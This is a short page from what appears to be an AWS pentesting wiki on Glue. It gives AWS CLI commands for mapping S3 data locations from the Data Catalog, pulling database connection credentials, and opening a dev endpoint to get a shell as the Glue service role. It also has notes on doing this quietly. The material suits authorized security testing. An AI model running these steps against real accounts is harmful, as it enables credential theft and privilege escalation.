---
title: "Glue: catalogs, job scripts, and the Glue service role"
description: "Reading the Glue Data Catalog and job scripts for data locations and secrets, and running jobs under the Glue role."
keywords:
  - Glue
  - Data Catalog
  - job
  - script
  - service role
---

# Glue

Glue is the ETL layer, and it leaks in three ways. The **Data Catalog** maps every table to its S3 location, so reading it is a treasure map of where the data lives. **Connections** store database credentials, sometimes returned by the API. And **jobs and dev endpoints** run arbitrary code under a Glue service role, which is the `PassRole` escalation covered under [identity](../identity/privilege-escalation/pass-role/glue.md).

## Reading the catalog and connections

```bash
aws glue get-databases ; aws glue get-tables --database-name <db> \
  --query 'TableList[].StorageDescriptor.Location'       # S3 paths to the data
aws glue get-connections --query 'ConnectionList[].ConnectionProperties'
```

## Running code under the Glue role

```bash
aws glue get-jobs --query 'Jobs[].[Name,Role,Command.ScriptLocation]'
# a dev endpoint gives an interactive session as the Glue role
aws glue create-dev-endpoint --endpoint-name x --role-arn <glue-role> \
  --public-key "$(cat key.pub)"
```

## Exploitation notes

- Job definitions name both the service role and the S3 script location; reading the script often reveals hardcoded secrets and the exact data paths.
- `get-connections` can return connection passwords depending on the caller's permissions, a direct credential source for the backing database.
- A dev endpoint is the quietest way to get a shell as the Glue role when you already hold Glue write permissions.

## Tools

- **AWS CLI** (`glue get-tables`, `get-connections`, `create-dev-endpoint`).
- **Pacu** (`glue__*`): enumerate jobs, connections, and endpoints.

## References

- [HackTricks Cloud: AWS Glue privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-glue-privesc.html)
- [AWS: Glue connections](https://docs.aws.amazon.com/glue/latest/dg/console-connections.html)
